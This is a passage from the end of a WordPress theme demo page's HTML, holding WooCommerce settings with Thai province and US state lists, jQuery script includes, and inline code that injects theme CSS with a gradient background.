(\u0e41\u0e21\u0e48\u0e2e\u0e48\u0e2d\u0e07\u0e2a\u0e2d\u0e19)\",\"TH-44\":\"Maha Sarakham (\u0e21\u0e2b\u0e32\u0e2a\u0e32\u0e23\u0e04\u0e32\u0e21)\",\"TH-49\":\"Mukdahan (\u0e21\u0e38\u0e01\u0e14\u0e32\u0e2b\u0e32\u0e23)\",\"TH-26\":\"Nakhon Nayok (\u0e19\u0e04\u0e23\u0e19\u0e32\u0e22\u0e01)\",\"TH-73\":\"Nakhon Pathom (\u0e19\u0e04\u0e23\u0e1b\u0e10\u0e21)\",\"TH-48\":\"Nakhon Phanom (\u0e19\u0e04\u0e23\u0e1e\u0e19\u0e21)\",\"TH-30\":\"Nakhon Ratchasima (\u0e19\u0e04\u0e23\u0e23\u0e32\u0e0a\u0e2a\u0e35\u0e21\u0e32)\",\"TH-60\":\"Nakhon Sawan (\u0e19\u0e04\u0e23\u0e2a\u0e27\u0e23\u0e23\u0e04\u0e4c)\",\"TH-80\":\"Nakhon Si Thammarat (\u0e19\u0e04\u0e23\u0e28\u0e23\u0e35\u0e18\u0e23\u0e23\u0e21\u0e23\u0e32\u0e0a)\",\"TH-55\":\"Nan (\u0e19\u0e48\u0e32\u0e19)\",\"TH-96\":\"Narathiwat (\u0e19\u0e23\u0e32\u0e18\u0e34\u0e27\u0e32\u0e2a)\",\"TH-39\":\"Nong Bua Lam Phu (\u0e2b\u0e19\u0e2d\u0e07\u0e1a\u0e31\u0e27\u0e25\u0e33\u0e20\u0e39)\",\"TH-43\":\"Nong Khai (\u0e2b\u0e19\u0e2d\u0e07\u0e04\u0e32\u0e22)\",\"TH-12\":\"Nonthaburi (\u0e19\u0e19\u0e17\u0e1a\u0e38\u0e23\u0e35)\",\"TH-13\":\"Pathum Thani (\u0e1b\u0e17\u0e38\u0e21\u0e18\u0e32\u0e19\u0e35)\",\"TH-94\":\"Pattani (\u0e1b\u0e31\u0e15\u0e15\u0e32\u0e19\u0e35)\",\"TH-82\":\"Phang Nga (\u0e1e\u0e31\u0e07\u0e07\u0e32)\",\"TH-93\":\"Phatthalung (\u0e1e\u0e31\u0e17\u0e25\u0e38\u0e07)\",\"TH-56\":\"Phayao (\u0e1e\u0e30\u0e40\u0e22\u0e32)\",\"TH-67\":\"Phetchabun (\u0e40\u0e1e\u0e0a\u0e23\u0e1a\u0e39\u0e23\u0e13\u0e4c)\",\"TH-76\":\"Phetchaburi (\u0e40\u0e1e\u0e0a\u0e23\u0e1a\u0e38\u0e23\u0e35)\",\"TH-66\":\"Phichit (\u0e1e\u0e34\u0e08\u0e34\u0e15\u0e23)\",\"TH-65\":\"Phitsanulok (\u0e1e\u0e34\u0e29\u0e13\u0e38\u0e42\u0e25\u0e01)\",\"TH-54\":\"Phrae (\u0e41\u0e1e\u0e23\u0e48)\",\"TH-83\":\"Phuket (\u0e20\u0e39\u0e40\u0e01\u0e47\u0e15)\",\"TH-25\":\"Prachin Buri (\u0e1b\u0e23\u0e32\u0e08\u0e35\u0e19\u0e1a\u0e38\u0e23\u0e35)\",\"TH-77\":\"Prachuap Khiri Khan (\u0e1b\u0e23\u0e30\u0e08\u0e27\u0e1a\u0e04\u0e35\u0e23\u0e35\u0e02\u0e31\u0e19\u0e18\u0e4c)\",\"TH-85\":\"Ranong (\u0e23\u0e30\u0e19\u0e2d\u0e07)\",\"TH-70\":\"Ratchaburi (\u0e23\u0e32\u0e0a\u0e1a\u0e38\u0e23\u0e35)\",\"TH-21\":\"Rayong (\u0e23\u0e30\u0e22\u0e2d\u0e07)\",\"TH-45\":\"Roi Et (\u0e23\u0e49\u0e2d\u0e22\u0e40\u0e2d\u0e47\u0e14)\",\"TH-27\":\"Sa Kaeo (\u0e2a\u0e23\u0e30\u0e41\u0e01\u0e49\u0e27)\",\"TH-47\":\"Sakon Nakhon (\u0e2a\u0e01\u0e25\u0e19\u0e04\u0e23)\",\"TH-11\":\"Samut Prakan (\u0e2a\u0e21\u0e38\u0e17\u0e23\u0e1b\u0e23\u0e32\u0e01\u0e32\u0e23)\",\"TH-74\":\"Samut Sakhon (\u0e2a\u0e21\u0e38\u0e17\u0e23\u0e2a\u0e32\u0e04\u0e23)\",\"TH-75\":\"Samut Songkhram (\u0e2a\u0e21\u0e38\u0e17\u0e23\u0e2a\u0e07\u0e04\u0e23\u0e32\u0e21)\",\"TH-19\":\"Saraburi (\u0e2a\u0e23\u0e30\u0e1a\u0e38\u0e23\u0e35)\",\"TH-91\":\"Satun (\u0e2a\u0e15\u0e39\u0e25)\",\"TH-17\":\"Sing Buri (\u0e2a\u0e34\u0e07\u0e2b\u0e4c\u0e1a\u0e38\u0e23\u0e35)\",\"TH-33\":\"Sisaket (\u0e28\u0e23\u0e35\u0e2a\u0e30\u0e40\u0e01\u0e29)\",\"TH-90\":\"Songkhla (\u0e2a\u0e07\u0e02\u0e25\u0e32)\",\"TH-64\":\"Sukhothai (\u0e2a\u0e38\u0e42\u0e02\u0e17\u0e31\u0e22)\",\"TH-72\":\"Suphan Buri (\u0e2a\u0e38\u0e1e\u0e23\u0e23\u0e13\u0e1a\u0e38\u0e23\u0e35)\",\"TH-84\":\"Surat Thani (\u0e2a\u0e38\u0e23\u0e32\u0e29\u0e0e\u0e23\u0e4c\u0e18\u0e32\u0e19\u0e35)\",\"TH-32\":\"Surin (\u0e2a\u0e38\u0e23\u0e34\u0e19\u0e17\u0e23\u0e4c)\",\"TH-63\":\"Tak (\u0e15\u0e32\u0e01)\",\"TH-92\":\"Trang (\u0e15\u0e23\u0e31\u0e07)\",\"TH-23\":\"Trat (\u0e15\u0e23\u0e32\u0e14)\",\"TH-34\":\"Ubon Ratchathani (\u0e2d\u0e38\u0e1a\u0e25\u0e23\u0e32\u0e0a\u0e18\u0e32\u0e19\u0e35)\",\"TH-41\":\"Udon Thani (\u0e2d\u0e38\u0e14\u0e23\u0e18\u0e32\u0e19\u0e35)\",\"TH-61\":\"Uthai Thani (\u0e2d\u0e38\u0e17\u0e31\u0e22\u0e18\u0e32\u0e19\u0e35)\",\"TH-53\":\"Uttaradit (\u0e2d\u0e38\u0e15\u0e23\u0e14\u0e34\u0e15\u0e16\u0e4c)\",\"TH-95\":\"Yala (\u0e22\u0e30\u0e25\u0e32)\",\"TH-35\":\"Yasothon (\u0e22\u0e42\u0e2a\u0e18\u0e23)\"},\"US\":{\"AL\":\"Alabama\",\"AK\":\"Alaska\",\"AZ\":\"Arizona\",\"AR\":\"Arkansas\",\"CA\":\"California\",\"CO\":\"Colorado\",\"CT\":\"Connecticut\",\"DE\":\"Delaware\",\"DC\":\"District Of Columbia\",\"FL\":\"Florida\",\"GA\":\"Georgia\",\"HI\":\"Hawaii\",\"ID\":\"Idaho\",\"IL\":\"Illinois\",\"IN\":\"Indiana\",\"IA\":\"Iowa\",\"KS\":\"Kansas\",\"KY\":\"Kentucky\",\"LA\":\"Louisiana\",\"ME\":\"Maine\",\"MD\":\"Maryland\",\"MA\":\"Massachusetts\",\"MI\":\"Michigan\",\"MN\":\"Minnesota\",\"MS\":\"Mississippi\",\"MO\":\"Missouri\",\"MT\":\"Montana\",\"NE\":\"Nebraska\",\"NV\":\"Nevada\",\"NH\":\"New Hampshire\",\"NJ\":\"New Jersey\",\"NM\":\"New Mexico\",\"NY\":\"New York\",\"NC\":\"North Carolina\",\"ND\":\"North Dakota\",\"OH\":\"Ohio\",\"OK\":\"Oklahoma\",\"OR\":\"Oregon\",\"PA\":\"Pennsylvania\",\"RI\":\"Rhode Island\",\"SC\":\"South Carolina\",\"SD\":\"South Dakota\",\"TN\":\"Tennessee\",\"TX\":\"Texas\",\"UT\":\"Utah\",\"VT\":\"Vermont\",\"VA\":\"Virginia\",\"WA\":\"Washington\",\"WV\":\"West Virginia\",\"WI\":\"Wisconsin\",\"WY\":\"Wyoming\",\"AA\":\"Armed Forces (AA)\",\"AE\":\"Armed Forces (AE)\",\"AP\":\"Armed Forces (AP)\",\"AS\":\"American Samoa\",\"GU\":\"Guam\",\"MP\":\"Northern Mariana Islands\",\"PR\":\"Puerto Rico\",\"UM\":\"US Minor Outlying Islands\",\"VI\":\"US Virgin Islands\"}}","plugin_url":"http:\/\/envision.wptation.com\/wp-content\/plugins\/woocommerce","ajax_url":"\/wp-admin\/admin-ajax.php","ajax_loader_url":"http:\/\/envision.wptation.com\/wp-content\/plugins\/woocommerce\/assets\/images\/ajax-loader@2x.gif","i18n_select_state_text":"Select an option\u2026","i18n_required_rating_text":"Please select a rating","i18n_no_matching_variations_text":"Sorry, no products matched your selection. Please choose a different combination.","i18n_required_text":"required","i18n_view_cart":"View Cart \u2192","review_rating_required":"yes","update_order_review_nonce":"de3629a225","apply_coupon_nonce":"12f1006257","option_guest_checkout":"yes","checkout_url":"\/wp-admin\/admin-ajax.php?action=woocommerce-checkout","is_checkout":"0","update_shipping_method_nonce":"109ee5caa8","cart_url":"http:\/\/envision.wptation.com\/cart\/","cart_redirect_after_add":"no"};
/* ]]> */
</script>
<script type='text/javascript' src='js/woocommerce.min.js'></script>
<script type='text/javascript' src='js/jquery.cookie.min.js'></script>
<script type='text/javascript' src='js/cart-fragments.min.js'></script>
<script type='text/javascript' src='js/jquery.prettyPhoto.js'></script>
<script type='text/javascript' src='js/extensions.js'></script>
<script type='text/javascript' src='js/woocommerce.js'></script>
<script type='text/javascript' src='js/waypoints.min.js'></script>
<script type='text/javascript' src='js/waypoints-sticky.js'></script>
<script type='text/javascript' src='js/jquery.viewport.mini.js'></script>
<script type='text/javascript' src='js/jquery.flexslider.js'></script>
<script type='text/javascript' src='js/widgets.js'></script>
<script type='text/javascript' src='js/jquery.jplayer.js'></script>

<script type="text/javascript">
// <![CDATA[
	var styleElement = document.createElement("style");
		styleElement.type = "text/css";

	var cloudfw_dynamic_css_code = "@media ( min-width: 979px ) { .modern-browser #header-container.stuck #logo img {height: 75px;  margin-top: 2px !important;  margin-bottom: 2px !important;}  }\r\n\r\nhtml #page-content .section-cr4zq {background-color:#f1f1f1; *background-color: #ffffff; background-image:url('data:image\/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHByZXNlcnZlQXNwZWN0UmF0aW89Im5vbmUiIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPg0KICAgIDxkZWZzPg0KICAgICAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImxpbmVhci1ncmFkaWVudCIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiIHNwcmVhZE1ldGhvZD0icGFkIj4NCiAgICAgICAgICAgIDxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNmZmZmZmYiIHN0b3Atb3BhY2l0eT0iMSIvPg0KICAgICAgICAgICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjZjFmMWYxIiBzdG9wLW9wYWNpdHk9IjEiLz4NCiAgICAgICAgPC9saW5lYXJHcmFkaWVudD4NCiAgICA8L2RlZnM+DQogICAgPHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgc3R5bGU9ImZpbGw6IHVybCgjbGluZWFyLWdyYWRpZW50KTsiLz4NCjwvc3ZnPg=='); background-image: -moz-linear-gradient(top, #ffffff, #f1f1f1); background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#ffffff), to(#f1f1f1)); background-image: -webkit-linear-gradient(top, #ffffff, #f1f1f1); background-image: -o-linear-gradient(top, #ffffff, #f1f1f1); background-image: linear-gradient(to bottom, #ffffff, #f1f1f1); filter:  progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#ffffff', endColorstr='#f1f1f1'); -ms-filter: \"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#ffffff', endColorstr='#f1f1f1')\"; background-repeat: repeat-x ;  border-top: 1px solid #ebebeb;  overflow: hidden;} html #page-content .section-cr4zq p {} html #page-content .section-cr4zq h1, html #page-content .section-cr4zq h2, html #page-content .section-cr4zq h3, html #page-content .section-cr4zq h4, html #page-content .section-cr4zq h5, html #page-content .section-cr4zq h6, html #page-content .section-cr4zq .heading-colorable {} html #page-content .section-cr4zq a {} html #page-content .section-cr4zq a:hover {} \r\nhtml #page-content .section-8wp3r {background-color:#63524A; background-image: none ;  background-image: url('http:\/\/envision.wptation.com\/wp-content\/uploads\/2013\/09\/bg.jpg'); -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; filter: none; -ms-filter: none;  overflow: visible;} html.old-browser #page-content .section-8wp3r {-webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http:\/\/envision.wptation.com\/wp-content\/uploads\/2013\/09\/bg.jpg',sizingMethod='scale'); -ms-filter: \"progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http:\/\/envision.wptation.com\/wp-content\/uploads\/2013\/09\/bg.jpg', sizingMethod='scale')\";} html #page-content .section-8wp3r p {} html #page-content .section-8wp3r h1, html #page-content .section-8wp3r h2, html #page-content .section-8wp3r h3, html #page-content .section-8wp3r h4, html #page-content .section-8wp3r h5, html #page-content .section-8wp3r h6, html #page-content .section-8wp3r .heading-colorable {} html #page-content .section-8wp3r a {} html #page-content .section-8wp3r a:hover {text-decoration: underline;} \r\nhtml #socialbar-1 .ui-socialbar-item {background-color:#2b2b2b; background-image: none ;} ";

	if (styleElement.styleSheet) {
		styleElement.styleSheet.cssText = cloudfw_dynamic_css_code;
	} else {
		styleElement.appendChild(document.createTextNode(cloudfw_dynamic_css_code));
	}

	document.getElementsByTagName("head")[0].appendChild(styleElement);

// ]]>
</script>

<script type="text/javascript">
// <![CDATA[
	cloudfw_load_css_file( 'theme-css-jplayer', 'css/jplayer.skin.css' );

// ]]>
</script>
</body>
</html>